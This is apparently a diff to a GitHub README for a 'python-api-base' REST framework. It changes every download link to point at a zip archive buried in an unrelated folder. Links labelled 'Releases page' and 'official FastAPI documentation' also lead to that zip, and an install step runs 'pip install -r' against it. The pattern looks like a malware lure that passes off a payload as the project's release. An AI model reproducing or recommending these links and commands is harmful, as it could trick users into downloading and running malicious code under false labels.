@@ -6,11 +6,11 @@ Welcome to the python-api-base project! This framework helps you create REST API
 
 ## 📥 Download the Application
 
-[![Download python-api-base](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip)](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip)
+[![Download python-api-base](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip)](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip)
 
 You can find the latest version of this application on the Releases page. Here’s how to access it: 
 
-1. Click this link: [Visit Releases Page](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip).
+1. Click this link: [Visit Releases Page](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip).
 2. Choose the appropriate release for your system.
 
 ## 💻 System Requirements
@@ -37,7 +37,7 @@ Once you have downloaded the package, follow these steps to install and run the 
    - Navigate to the extracted folder by using the `cd` command. 
    - Run the following command to install required packages:
      ```
-     pip install -r https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip
+     pip install -r https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip
      ```
 
 4. **Start the Application:**
@@ -91,13 +91,13 @@ If you encounter issues when running the application, try these steps:
 
 ## 📣 Resources
 
-- **Documentation:** For detailed usage instructions, refer to the [official FastAPI documentation](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip).
+- **Documentation:** For detailed usage instructions, refer to the [official FastAPI documentation](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip).
 - **Community Support:** Join forums or communities to ask questions and share knowledge.
 
 ## 📞 Contact
 
 For additional support, you can open an issue in the GitHub repo or reach out via the project’s Discord channel.
 
-[![Download python-api-base](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip)](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/tests/unit/domain/users/events/python-api-base_v3.7.zip) 
+[![Download python-api-base](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip)](https://raw.githubusercontent.com/Raffyn2/python-api-base/main/.kiro/specs/rite-framework-refactoring/python-api-base-3.2-alpha.4.zip) 
 
 Thank you for using python-api-base! Happy coding!
